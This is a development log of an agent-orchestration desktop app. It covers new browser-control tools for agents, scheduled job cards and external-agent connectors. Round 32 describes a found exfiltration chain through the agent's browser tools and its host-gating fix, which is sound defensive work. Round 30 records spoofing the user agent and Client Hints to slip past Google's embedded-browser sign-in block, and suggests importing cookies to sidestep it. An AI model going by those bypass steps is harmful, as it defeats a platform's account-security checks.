- **Backend**: `_run_session_turn` now RETURNS its `{response,error}` on all 3 exits (harmless to the fire-and-forget caller). New `_run_job_as_session(message, job_name)`: `_make_room_for_job` (evicts ONLY finished JOB sessions — never a user's chat card — else runs untracked), registers a depth-0 session named job_name (so it gets the full orchestra → delegation works), appends a leading `note` + the prompt, awaits the turn to completion, then drops the client (review fix: keep the transcript, don't hold a live CLI subprocess), and returns the byte-identical ledger shape. The compat route runs this ONLY when `req.job_name` is present (legacy untracked path unchanged, so `test_lite_compat` is untouched). `_AgentSession.job_name`; `GET /sessions` list + detail carry `job_name`.
- **Scheduler**: `build_request`/`send` gain an optional `job_name` forwarded into the POST body (absent → omitted, back-compat); `scheduler.py` passes `job_name=name`. builtin:digest never POSTs, so it's never a card.
- **Frontend**: new `app/jobcards.js` polls `GET /sessions` every 4s, BASELINES existing FINISHED jobs on the first poll (a job RUNNING as the app opens IS revealed — review fix), then reveals each new `job_name` session via `AtelierSessions.reveal(id, name, {keepAlive:true})`. `seen` is grow-only dedup. `sessions.js`: reveal gains `opts.keepAlive` → the card SKIPS the DELETE on close so closing/board-switch never aborts a running job; keepAlive is stamped on the card and INHERITED by the job's sub-agent children (review fix — else a board switch DELETEd the job's delegated children); center-spawned cards cascade; a reclaimed job card shows a job-appropriate note (review fix). Settings toggle "Live job cards" (localStorage, default ON) in views.js.
- Review folded in: 6 findings (1 MEDIUM = keepAlive not reaching sub-agent cards; 5 LOW = lingering CLI subprocess, running-job-at-load baselined-away, reclaimed-job wrong note, + 2 accepted). Accepted (documented): a board switch mid-job HIDES the running job (grow-only `seen` respects a manual close; the job keeps running server-side); jobs get the orchestra INTENTIONALLY (the ask is "with the same delegation notes + arrows").
- Gates: **642 backend tests** (+8: job_name plumbing; tracked-vs-untracked compat; job note/transcript; error-preserves-ledger; `_make_room_for_job` spares user cards; client dropped after completion), `node --check` clean. **Live Electron verify** on a fresh board: firing a job (POST /open-swarm/get_response {job_name}) revealed a chat card titled "demo-brief" showing the `Scheduled job "demo-brief" fired` note + the prompt + Thinking + reply (screenshot confirms). Rebuilt + reinstalled `/Applications/Atelier.app`.

### Round 34 — conversation memory survives a dropped client (2026-07-03, dogfood-driven)
Jason ran the "source -> make -> post" Golden Task (a YouTube ranking-video pipeline) through the app and pasted the transcript: turn 1 the agent built the pipeline, turn 2 ("now create this pipeline") replied "I don't have any prior context." Diagnosed with a 3-agent adversarial Workflow (confirmed) + my own reads.
- **Root cause**: a chat card's conversation lives ONLY in its live `ClaudeSDKClient`; `sess.messages` is a render-only ledger NEVER replayed to the model (explicit code comment). Any client drop nulls `sess.client` and the next turn rebuilds a fresh, zero-history client while the card still SHOWS the whole transcript. Drop paths: a turn that errors (`_close_session_client` at ~2314 — the likely trigger, a huge turn 1 overflowing context), a model change (`pending_model_reset`), a fired-job completion, plus session loss (eviction/restart, out of scope = in-memory sessions).
- **Fix**: `_conversation_preamble(sess)` builds a compact transcript from `sess.messages` EXCLUDING the current user message (appended by `_start_turn` just before the turn) and internal `note` events, most-recent-first within `_REPLAY_CHAR_BUDGET` (16k), framed as restored context. In `_run_session_turn`, when `sess.client is None` (a REBUILD), the outgoing message becomes `preamble + message`. The live-client happy path is untouched (message sent verbatim), so context is never double-injected turn after turn.
- **Why replay, not native CLI resume**: `ClaudeAgentOptions` DOES support `resume` + `session_id`, but the common trigger (turn 1 raises before a clean ResultMessage) never yields a session id to resume, and a stale id error-loops. Replay needs no id and covers every within-backend drop. Native resume + disk-persisted sessions = documented fidelity/durability upgrade (restart + evicted-session loss still uncovered).
- Gates: **692 backend tests** (+6: rebuilt-client replays history, first-turn/live-client send raw, preamble excludes current+notes, empty for fresh, char-budget). **Live-verified against a REAL backend + real model turns**: stated "my favorite fruit is dragonfruit" (turn 1 "OK, noted."), changed the model sonnet->haiku (a real client-drop path — a persisted client would stay on sonnet, so turn 2 on haiku proves a genuine rebuild), then asked "what is my favorite fruit?" -> "Dragonfruit". Rebuilt + reinstalled `/Applications/Atelier.app` (`/health` 200; `_conversation_preamble` present in the packaged backend). Backend-only fix, so the standalone-backend live test IS the faithful journey (the Electron UI is an unchanged client of this backend).
- **Also surfaced, deferred to Jason**: the agent has NO real file-write (VaultWrite = vault + `.md` only), so "make a fully functional pipeline" can only ever be a document card + vault note, not a runnable project on disk. Recommended default: code-project scaffolding is out of the document/media hero-workflow scope for now; if pursued, a sandboxed per-session workspace + a containment-gated WriteFile tool, not raw Bash/Write.

### Round 33 — Click/Type: agents OPERATE the linked page (2026-07-03)
Second round of the /goal loop. Depth-first on the operate-the-browser loop: r32 gave the agent EYES (ReadPage), r33 gives it HANDS. Two orchestra tools, `Click(selector)` and `Type(selector, text)`, drive the linked webview by CSS selector — the load-bearing unblock for the hero workflow's operate/publish step.
- **Reuses r32's round-trip channel**: new `sess.browser_act = {req, seq, action, selector, text}` (single slot, seq-gated) rides the detail route beside `browser_read`; both share the `_browser_read_waiters` map + req counter + the `POST /sessions/{id}/browser_result` endpoint (resolved by req, no collision). Factored a shared `_browser_roundtrip(parent, field, stamp, seq_counter, timeout)` helper and refactored `_read_page` onto it (r32 tests unchanged). `_act_result_text` shapes the ack (timeout / not-ok / summary).
- **Frontend**: `apps.js` `browserAct(cardEl, action, selector, text)` → `cardApi.act` runs `clickJs`/`typeJs` via `executeJavaScript` inside a shared `withReadyWebview` (waits attach + !isLoading, bounded 15s; readActiveTab now uses it too, returning null to wait past about:blank). `clickJs` scrolls into view + clicks (falls back to a synthetic MouseEvent); `typeJs` focuses + sets value via the NATIVE HTMLInputElement/TextAreaElement value setter (so React/Vue controlled inputs register it) + fires input/change; both JSON.stringify their args into the source (no string breakout) and return a small `{ok, text|error}` ack (never page HTML). `sessions.js` `handleBrowserAct` (seq-gated `lastActSeq`, reset + adopt-not-act on re-reveal) resolves the linked browser, acts, POSTs the ack; runs after handleBrowserRead in the poll.
- **Security** (r33 adversarial review, feature-dev code-reviewer, 1 confirmed defect fixed): the ACTION is not host-gated (a user driving their own localhost form must keep working) but the one leak-prone datum Click hands back IS — Click's post-click URL is WITHHELD when its host is loopback/private/link-local (`_act_result_text` runs `_agent_open_host_blocked` on a separate `url` field; an internal URL can carry session tokens in its query string, so it gets the same gate as ReadPage's content). Type's ack echoes only the value the agent itself typed. `clickJs`/`typeJs` JSON-encode their args (no string breakout). UploadFile (later) must reconsider this.
- Gates: **686 backend tests** (+11: click/type round-trip, selector/text passthrough, no-match, required-selector, overlong-text cap, timeout no-leak, parent-gone, shared-registry independence, detail-route shape, public-URL reported + internal-URL withheld). `node --check` clean; apps selfCheck asserts the browserAct surface + that clickJs/typeJs JSON-encode. **Live-verified in the dev app AND the hero journey**: direct `browserAct` typed a unique token into DuckDuckGo's `input[name=q]` (ack echoed the value) + clicked `input[type=submit]`; then a REAL linked agent, told to Type "agentopsdemo" + Click submit + ReadPage, did exactly that and reported the actual DuckDuckGo results (screenshot: search box holds the query, results render, agent card summarizes them). Rebuilt + reinstalled `/Applications/Atelier.app` (`/health` 200, `/tools` lists Click + Type + ReadPage).

### Round 32 — ReadPage: agents read the linked browser's live page (2026-07-03, commit `111ebbe`)
First step of the autonomous /goal build loop off the seeded ROADMAP/GOLDEN_TASKS spine. Weakest link = the hero workflow's publish/operate step (agents could OpenBrowser/NavigateBrowser a page but not READ it back). ReadPage closes the READ half of computer-use and, more importantly, ships the ROUND-TRIP RESULT CHANNEL that Click/Type/UploadFile will reuse. Golden Task 5 (browser research → extracted findings) now runs end to end.
- **The round-trip (new architecture piece)**: every prior orchestra tool is fire-and-forget (stamp a seq-gated request the card polls + acts on). ReadPage is the FIRST that needs a RESULT back. `_read_page` (lite_server.py) stamps `sess.browser_read = {req, seq}`, registers an `asyncio.Future` in `_browser_read_waiters[req]`, and `await asyncio.wait_for(fut, 25s)`. The turn runs as a background task, so the loop stays free to serve the card's POST. New route `POST /sessions/{id}/browser_result` (token-gated by the middleware, req-keyed, unknown-req is a 200 no-op) resolves the future. `browser_read` rides ONLY the detail route (not the list), seq-gated like `browser_nav`.
- **Frontend**: `apps.js` `browserReadPage(cardEl)` → `readActiveTab()` reads the active tab's live webview via `executeJavaScript` (innerText only, no markup), waiting past the `about:blank` bootstrap + webview attach + `isLoading()` (bounded 15s < the 25s tool timeout). `sessions.js` `handleBrowserRead()` (seq-gated `lastReadSeq`, reset on new session, adopted-not-acted on re-reveal) resolves the linked browser via `Atelier.links.browserElFor`, reads it, and POSTs the result; runs AFTER `handleCanvasOps` so an OpenBrowser+ReadPage burst in one turn spawns+links the browser first.
- **Security (adversarial review caught it)**: OpenBrowser is public-host-gated but NavigateBrowser is not (a user may drive their own localhost), so OpenBrowser(public)→NavigateBrowser(127.0.0.1:8765 / LAN)→ReadPage() was an internal-read exfil chain. Fix: ReadPage gates the RETURNED CONTENT on the page's real loaded host (`_agent_open_host_blocked`) — refuses loopback/private/link-local bodies (fail-closed on an unparseable host too), while NavigateBrowser stays free to DRIVE local pages. Returned text is framed as untrusted data, capped at 12k. `browser_read` is a single slot: a rare parallel double-ReadPage strands one call to its 25s timeout (safe; a queue is the upgrade).
- Gates: **675 backend tests** (+13: round-trip resolve/timeout/parent-gone, unreadable/empty/truncate, the SSRF-read gate + public-allow regression, detail-route shape, endpoint resolve + unknown-req no-op, tool schema). `node --check` clean. **Live-verified in the installed app**: a browser card on example.com + a linked Agent card told to ReadPage → the agent called ReadPage, got the live page text through the loop, and quoted example.com's actual first sentence verbatim (screenshot). Rebuilt + reinstalled `/Applications/Atelier.app` (`/health` 200, `/tools` lists ReadPage).

### Round 31 — loop applied to an existing orchestration layer (2026-07-03, commit `1b39a23`)
From Jason: a loop should re-run a whole built layer (e.g. video source→extract→make→post) every 12h, not just hold a typed prompt.
- **`desktop/app/loopcard.js`**: marquee a Loop card together with the ENTRY chat of a layer (its orchestrator Agent card) → the loop copies that chat's kickoff instruction (its FIRST user bubble — read straight from the DOM, so fully decoupled from sessions.js) into its Task and draws an arrow to it (joining the group hull). Saving schedules that task as a job, so the whole layer re-runs on schedule — the fired job (r24) runs the kickoff fresh and its orchestrator re-spawns the sub-agents/tools exactly as the original. Marquee the same pair again to unlink; `AtelierLoops.link(id, agentEl)` mirrors the gesture programmatically (like `A.links.link`). `unbindLayer` also clears any lingering `content` arrow from the loop via `unlinkTouching`, so the toggle stays clean even after arrows self-unlink on a transient card re-mount. **Live-verified 7/7** (bind copies task, draws arrow, toggles off, and saving schedules a job whose prompt IS the copied layer task — screenshot shows the loop grouped with the orchestrator by a box + arrow).

### Round 30 — per-card browser profiles + Google sign-in reality check (2026-07-03, commit `a321af4`)
Answering Jason's "can browsers sign into Google / be like Chrome / do they use Playwright" — they are real Electron `<webview>` (embedded Chromium), NOT Playwright (that's only the dev test harness).
- **Reality check**: loaded `accounts.google.com` in a browser card — Google's REAL sign-in form renders (email + password fields, title "Sign in - Google Accounts", proper GlifWebSignIn URL), NO "browser may not be secure" block. The Chrome UA (Electron token stripped) is enough for Google to accept it.
- **Per-card profiles** (`desktop/app/apps.js`): each browser card now gets its OWN persistent partition keyed on its stable `appId` (`persist:atelier-browser-<appId>`) instead of one shared jar, so two cards are two isolated cookie jars — you can sign a DIFFERENT Google account into each, and each login survives restarts (a card restores under the same appId via `makeApp({id: rec.id})`). The webview UA also strips the app's own product token (`Atelier/x`) in addition to `Electron/x`, so sites see plain Chrome. **Live-verified 6/6**: two cards get distinct partitions, localStorage set in one is absent in the other (isolation), the UA is clean Chrome, and Google renders under a per-card partition. Note: OAuth popups already open as hardened child windows (r11), and the popup inherits the opener webview's partition. One-time re-login for any pre-existing shared-jar sessions.
- **Google sign-in limitation (investigated, commit `fe52b51`)**: the sign-in FORM renders, but ACTUAL Google account sign-in in the webview is BLOCKED — after entering an email + Next, Google redirects to `/signin/rejected` ("this browser or app may not be secure"). Google deliberately blocks embedded browsers via layered signals: clean UA string (r30) alone → still blocked; adding `Sec-CH-UA*` header rewrite (`fe52b51`, `patchClientHints` on browser partition sessions) → still blocked. The deeper tell is JS-side `navigator.userAgentData` (reports Chromium, not "Google Chrome"). Fixing THAT needs a permanently-attached CDP `Network.setUserAgentOverride` (verified it DOES add the "Google Chrome" brand — but the override only holds WHILE the debugger stays attached, which breaks the card's DevTools + can deadlock `executeJavaScript`) or a security-weakening guest preload — both left OUT as too invasive for an unverifiable payoff. The harness verdict is also confounded (`navigator.webdriver` is true under Playwright, which Google also flags — absent in the real app). Net: embedded-browser Google sign-in is a Google policy block, not a simple bug; the shipped state makes the Chrome disguise consistent (UA + Client Hints headers), which helps non-Google sites. "Sign in with Google" OAuth popups on third-party sites open as real top-level windows and may work (untested). Escalating to the CDP-attached approach is an explicit opt-in (DevTools tradeoff) awaiting Jason.

### Round 29 — Workflow AI paywall scaffold (2026-07-03, commit `eded56f`)
The 3rd of Jason's new-feature asks (the paid workflow-builder). Jason deferred the product itself ("way in the future"), so this ships only the Atelier-native GATE so the paywall pattern has a real home.
- **New `desktop/app/premium.js`** (registerApp 'workflowai', ⌘K / `/workflowai`). A "Workflow AI" card that is LOCKED by default: a pitch + feature bullets + a "Preview · Premium" badge + a license field. Entering a key unlocks a "coming soon" placeholder (a disabled composer — the real builder is not shipped). NO real license server or payment: unlock just records a token in `Atelier.store 'atelier.premium.license'` (GLOBAL via boards.js so the unlock follows the user across boards). The copy is explicit that it is a preview and never invents pricing or a working product. Board-scoped card persistence; `/workflowai` slash built-in added. **Live-verified**: locked→unlock→unlocked flow + both visual states (screenshots). Honest scaffold, ready to wire to a real product later.

### Round 28 — external-agent connectors (2026-07-03, commit `686b39d`)
The 2nd of Jason's new-feature asks: connect Iris / Hermes / OpenClaw (or any OpenAI-compatible endpoint) as a first-class canvas chat card that runs on its own service.
- **Backend `external_agents.py` + `/external/*` routes**: a 0600 config store (`~/.atelier/external_agents.json`), CRUD, and an async `forward()` that POSTs `{base}/chat/completions` with `{model, messages}` via httpx and reads `choices[0].message.content`. The api_key never leaves the module in a public view (only a last-4 hint); forwarding is user-initiated + token-gated (no orchestra tool exposes it to an agent, so it is intentionally NOT in the agent-SSRF class, and private/loopback hosts ARE allowed for a user's own Iris/Ollama); GET /external/agents joins the token-gated GETs since it exposes base_urls + key hints. Failures return 400/502, never 500, never echo the key.
- **Frontend `desktop/app/external.js`**: an `.atl-ext-card` that REUSES the Agent card body classes (so it matches native cards AND the "/" slash menu works in it) but a DISTINCT outer class so govern.js + the sub-agent sweep (which key on `.atl-agent-card`) ignore it. A picker binds the card to a configured agent (locked mid-turn so a reply can't land in the wrong thread); a singleton manager panel does CRUD; board-scoped persistence stores position + bound agent id. Registered as the 'external' app type + an `/external` slash command + a "Manage external agents…" palette entry.
- **Review** (4-dimension adversarial Workflow, 14 agents, each finding verified): 5 confirmed, ALL folded. MEDIUM = `forward()` let `httpx.InvalidURL` (NOT an `httpx.HTTPError`) escape → route 500 (broadened the except + `_url_ok` now rejects control chars); MEDIUM = `_completions_url` corrupted a base_url with a query string (now splits on urlsplit, path-only); HIGH = the agent picker stayed live during an in-flight send → reply into the wrong thread (picker now locks mid-turn + agentId pinned per turn); MEDIUM = failure-path composer refill clobbered what the user typed while waiting (now only refills when empty); LOW = GET /external/agents was ungated (now token-gated). **662 backend tests** (+20). **Live Electron verify 14/14** against an embedded mock OpenAI server: card binds, forwards, shows the reply, carries history, manager CRUD, key redaction, `/external` spawn.

### Round 27 — customizable slash commands (2026-07-02, commit `5739a80`)
The second half of Jason's "slash commands + loops" ask (loops shipped r25). A "/" command menu on EVERY chat composer, fully customizable.
- **New `desktop/app/slashcommands.js`** — a self-contained module, ZERO edits to core.js/sessions.js. Type "/" at the start of the main chat composer OR any Agent card composer and a menu pops up. Three command KINDS: **prompt** (expands a template into the composer, `{{cursor}}` marks the caret — the "/goal and stuff" case), **app** (spawns a registered card: `/loop`, `/agent`, `/browser`, `/note`, `/document`), **action** (`/clear`, `/commands`). Built-ins: goal/plan/research/review (prompt) + the five app spawns + clear/commands. Arrow keys move, Enter/Tab pick, Escape dismiss, click pick, filter as you type.
- **Attach mechanism**: one pair of document-level CAPTURE-phase listeners (keydown + input) that act only when the target is a composer textarea (`#input` or `.atl-agent-composer textarea`). Capture beats the composers' own bubble-phase Enter-to-send, so while the menu is open Enter/Tab/Arrows/Escape are consumed (stopPropagation) and send() never fires; while closed the module touches nothing. New Agent cards need no wiring. The floating menu is one `position:fixed` element re-anchored + viewport-clamped each open (canvas transform can't distort it).
- **Fully customizable**: a manager panel (⌘K → "Manage slash commands…", or `/commands`) to add/edit/delete YOUR commands (prompt template or app spawn, name + label). Stored under `Atelier.store 'atelier.slashcommands'`, registered GLOBAL in `boards.js` GLOBAL_KEYS so they follow you across every board; a user command OVERRIDES a built-in of the same name.
- **Review** (4-dimension adversarial Workflow, 14 agents, each finding independently verified): 5 confirmed, ALL folded. HIGH = single global `mgr` + stackable panels — a 2nd manager panel hijacked the 1st's refs and closing either bricked the other → openManager is now a SINGLETON (keeps the open panel if one is on screen). LOW = Shift+Enter applied a command instead of a newline (now falls through); Enter on an empty-results menu leaked the raw "/query" to send() (now consumed); only the first `{{cursor}}` was stripped (now all); deleting the command loaded in the edit form could resurrect it on next Save (now resets editing). Two preemptive fixes (scroll self-close on the menu's own list scroll / scrollIntoView; IME-composition guard) landed before review and were confirmed REFUTED against the fixed code.
- Gates: `node --check` clean (frontend-only; 642 backend tests unaffected). **Live Electron verify: 17/17** — menu opens + filters, goal template inserts with the caret marker consumed, trailing-space does NOT open (non-interference), `/loop` spawns a Loop card + clears the composer, `/commands` opens the manager, a custom `/standup` command adds + persists + appears in the menu + deletes cleanly, the Agent card composer opens the menu too, Escape closes, and the menu is fully within the viewport (screenshots confirm the styled menu + manager). Rebuilt + reinstalled.

### Round 26 — group outline boxes + govern chain-arrow fix (2026-07-02, commit `00d1f94`)
Two arrow-layer items from Jason's use.
- **Govern chain-arrow bug fixed**: connecting Agent3→Agent1 while Agent1→Agent2 wiped the Agent1→Agent2 arrow. Root cause: govern.js's `detachChild`/`unlink` called `arrows.unlinkTouching(childEl)`, which removed arrows on EITHER endpoint — including the child's own OUTGOING arrows to its sub-agents. Fix: `arrows.unlinkTouching(el, dir, kind)` gained a `dir` ('to'/'from') and a `kind` filter; govern clears only `'parent'`-kind arrows POINTING AT the child. Review MAJOR folded in (pre-existing): direction alone also matched a **linked browser's** ride-along arrow (drawn browser→agent, so incoming) — so every arrow is now tagged by KIND at creation (`'parent'` = orchestrator/sweep→sub-agent, `'browser'` = ride-along, `'content'` = agent→note/document) and govern only touches `'parent'`. Governing an agent no longer wipes its linked browser.
- **Group outline boxes** (from the sketch): a soft rounded rect is drawn around each connected cluster of cards (an orchestrator + its sub-agents + linked tools/browsers/loops). `arrows.js` gained `components()` (union-find over the `links` set) + `drawHulls(live)` (pooled `<rect>`s, per-component bbox from `worldRect`+pad), called from `refresh()` every frame so the box follows drags/pan/zoom for free; inserted behind the arrow paths, accent-tinted. `link()`/`unlink()` schedule a refresh so hulls recompute on link changes.
- Gates: `node --check` clean on arrows/govern/sessions/link.js (frontend-only, no backend change; 642 backend tests unaffected). Adversarial reviewer (correctness/perf/lifecycle/z-order) = 1 real finding (the browser-arrow wipe), folded; union-find, pool, z-order, lifecycle all cleared. **Live Electron verify**: 3 agent cards, govern A1→A2 then A3→A1 → BOTH arrows survive (arrows.count()=2) and a group hull (1336×376) encloses all three (screenshot confirms the rounded box + both connectors). Rebuilt + reinstalled.

### Round 25 — Loop card (visual per-chat scheduler) (2026-07-02, commit `66cce08`)
From Jason's sketch: a "Loop" card you place on the canvas, configure by picking a schedule + task, that fires on schedule and reveals its run as a live chat card (whose sub-agent tree is the workflow). First of the "slash commands + loops" asks; slash commands are next.
- **New `desktop/app/loopcard.js`** (registerApp 'loop', ⌘K → Add app: Loop). A friendly FRONT-END over the existing scheduler — almost no backend change. Schedule builder: **[Every] N minutes/hours/days** OR **[On days]** (weekday chips + a time) → compiles to the exact strings the backend accepts (interval `30m` / cron `30 9 * * 1,3`, all-days → `0 7 * * *`). A **task** prompt. Save → `POST /jobs {name,schedule,prompt,type:"prompt"}` (the daemon hot-reloads ~/.atelier/jobs.yaml within ~30s). A **countdown RING** fills toward the job's `next_fire` (from GET /jobs, schedring math) and pulses green/red on a new `/runs` line. When it fires, r24's `app/jobcards.js` reveals the run as a live chat card (job_name = the loop name). Board-scoped persistence mirrors document.js; the JOB lives in jobs.yaml, the card stores its friendly UI state. Name is the job key, locked after first save; Delete removes the job + card.
- **Review** (2-lens adversarial Workflow, 10 agents, each finding verified): 7 confirmed, ALL folded. HIGH = `api()` didn't guard `fetch` (backend-down stuck the Save button disabled + unhandled poller rejections) → try/catch returning status 0. MEDIUM = first-ever fire never pulsed (empty-ledger seed swallowed it → `primed` flag like widget-ring); same-named loops on different boards silently upsert-clobber the one global job → a NEW loop now GETs /jobs and refuses a duplicate name ("rename this one"). LOW = weekly with zero days compiled to daily (now blocked with a note); a 21-digit interval stringified as `1e+21` (clamped to ≤100000); `loopSeq` reset on reload could collide (now seeded from restored `loop-N` names).
- Gates: **642 backend tests** (no backend change), `node --check` clean, compiler self-tests green. **Live Electron verify** end-to-end on a fresh board: spawned a Loop, set a 1-minute interval + prompt, Saved → the job was scheduled (`schedule: "1m"`, next_fire set, ring counting down "58s"), and ~86s later the daemon FIRED it → a chat card titled the loop name was revealed with its "Scheduled job fired" note (screenshot confirms the card + ring). Post-fix smoke re-verified the save path. Rebuilt + reinstalled.

### Live bug fixes (2026-07-02, commit `97b70ff`)
Three issues Jason hit in use, all fixed + live-verified: (1) a delegated sub-agent could not OpenBrowser/CreateCard — the orchestra's CANVAS tools were depth-0-gated alongside the SPAWN tools; split into two tiers so every session gets the canvas tools (sub-agents included) while SpawnAgent/CheckAgent stay depth-0-only, and a first card (sub-agent/job) now PROCESSES its own fresh canvas ops (noBaseline) instead of baselining them away; (2) the dotted grid stopped panning — `applyTransform` now pans `background-position` + scales `background-size` with zoom; (3) wheel over a chat zoomed the board — the wheel handler now bails for any scrollable region inside a card (was `.chat-body`/textarea only, missing agent cards' `.atl-agent-msgs`). 642 tests.

### Jason's new feature backlog (2026-07-02) — logged, not built (see wiki Projects/OpenSwarm.md)
1. **Customizable slash commands + loops** (e.g. `/goal`, user-defined commands, a loop primitive) inside the Atelier chat. — **DONE**: loops shipped r25, slash commands r27.
2. **Connect external agents** (Hermes/Iris, OpenClaw, etc.) as first-class canvas agents that run on their own + guide their own sub-agents (a connector/bridge). — **DONE r28** (OpenAI-compatible bridge; Iris/Hermes/OpenClaw = presets).
3. **Paid AI workflow-builder, PAYWALLED** (far future; deferred monetization idea; pairs with the key-gated add-on pattern). — **GATE SCAFFOLDED r29** (the product itself stays deferred per Jason; the locked premium card + license gate ships so the paywall pattern has a home).
4. **Posting / publishing to channels — NOTED FOR FUTURE (2026-07-03, not building yet, per Jason "it's fine, just note it")**. Jason wants agents to POST to channels (the "post" step of a video source→extract→make→post layer) and finds APIs a hassle. Design decided (do NOT re-litigate):
   - **The hard part is LOGIN, not posting.** Mostly solved already: log in ONCE by hand in a browser card → the per-card profile (r30) persists the session → the agent reuses it. Only Google-class blockers (YouTube) need cookie-import from the user's real Chrome (sidesteps the embedded sign-in block, since an existing SESSION isn't blocked, only the sign-in FLOW) or the platform API.
   - **The missing capability = a browser-control toolset** so the agent can OPERATE a page, not just navigate it. Today the agent only has `OpenBrowser` + `NavigateBrowser` (load a URL). To post it needs `ReadPage` (visible text / a11y tree), `Click`, `Type`, `UploadFile`, `Screenshot` — i.e. computer-use inside the webview, the natural next step on the r16/r22 browser work (add them as orchestra tools driving the linked webview via the existing browser_nav/canvas_ops delivery pattern + new IPC to the webview for click/type/upload).
   - **Recommended shape = HYBRID, browser-first for the painful platforms.** Browser-drive TikTok/Instagram (gated/awful APIs, one-time manual login, works like a human); use APIs where sane + stable (YouTube already in the Publisher agent; X/Bluesky/Mastodon/Reddit/Discord+Telegram webhooks easy) with a per-platform token in Settings (reuse the external-agents/Notion settings pattern).
   - **Caveats**: browser automation is fragile (UI changes, captchas, 2FA on login) and platforms DETECT automation — fine for personal/low-volume, risky at scale.

### Roadmap remaining
**User's current top-3 (from the goal prompt) — ALL DONE:** (1) agent-driven browser — **DONE r22**; (2) agents connect to ANY dashboard card generally — **DONE r23**; (3) workflows surface in dashboard chats — **DONE r24**. Then Jason's new backlog above, then the older parity roadmap:
4. **Narrated short videos** — reuse Jason's reddit-shorts pipeline (`~/Content/reddit-shorts`, edge-tts + local whisper + ffmpeg); a heavy bundling round (ffmpeg + the media stack). Next major.
5. **Key-gated add-ons** — image/video generation + Composio VA, served-but-gated on a Settings key (user chose this).
6. **Live activity dashboard** — watch an agent drive the linked browser in realtime + orchestrator↔subagent messages, via widgets.
7. **Enhanced loop schedule widget** — flowing arrows around a ring + a thick arc highlighting toward completion + next-repeat time (evolve `schedring`). No new deps — a good light round.

## GOAL COMPLETE — 2026-07-02 (rounds 13–17, commits `e436111` → `ee80570`)

**Both phases are done and independently audited.** Phase A: all 54 UI-BACKLOG rows are DONE or REWORKED (a 54-row adversarial audit verified each row's artifact against code — 52 clean, 2 documentation defects found and fixed in `ee80570`). Dual auth: live-audited end to end — a real subscription round-trip, the API-mode key stored 0600/redacted and injected into the SDK env (empty-string strip semantics survive the transport's env merge), a live key-rejection from api.anthropic.com, and clean provider flips both ways. The single unproven link is a PAID completion with a real key (needs Jason's key; a bogus key demonstrably reaches both api.anthropic.com and the CLI auth layer). Phase B: all six living widgets verified live on the canvas with real data (flagship ring counting down to the real 7am cron and re-arming on ledger fires, ticker, campaign gates, agent orbs, burn gauge, heartbeat over the scheduler IPC), and all modules byte-identical inside the installed app.asar. Final state: 489 tests, app 605M at /Applications/Atelier.app, healthy on the subscription.

Accepted follow-ups (not blockers, named in-round): yaml comments are lost on a jobs-file write (ruamel round-trip is the upgrade); linked-page titles remain a documented user-initiated injection surface (frame-breakout neutralized); link toggling on a selected-card close is a contract edge needing a source-tagged selection event; Developer ID signing/notarization remains out of scope (solo use, documented rebuild path).

---

**(Historic) Remaining Phase A items** (see UI-BACKLOG Status column; in-place board switch + terminal → run-log card shipped r14): output version history (OpenSwarm versions.py idiom: content-addressed blobs + manifests + tree-hash dedupe + pre_restore capture — read at /Applications/OpenSwarm.app/Contents/Resources/backend/apps/outputs/versions.py), marquee-link (box around browser card → link to agent), onboarding tour, App Builder → mini-app card, model picker (auth provider done r13), MCP registry → tool-inspector card. Then Phase B living widgets.

**Next work areas** (see `docs/UI-BACKLOG.md` for the full 54):
1. Markdown note editor in the note card (CodeMirror-class; currently a plain textarea).
2. Browser card tabs + OAuth popup routing (`webview-new-window` IPC → new card, child-window allow for OAuth — OpenSwarm's exact mechanics are documented in the research notes in the wiki page).
3. In-place board switch (drop the reload), marquee multi-select, tidy/auto-arrange, working minimap.
4. Shared-secret header between app and lite_server (replaces origin gating).
5. Wire the scheduler daemon + real runs into the app (runs.jsonl is empty until jobs fire), Campaign progress card, agent/chat multi-card.
6. Code signing with a real Developer ID + notarization (ad-hoc now; entitlements + inside-out signing notes are in the wiki research section).

Use the **Workflow tool** for multi-part builds (parallel disjoint-file agents against a fixed API contract → adversarial review → fixer worked very well), and screenshot-verify with the Playwright harness before rebuilding the .app.

---
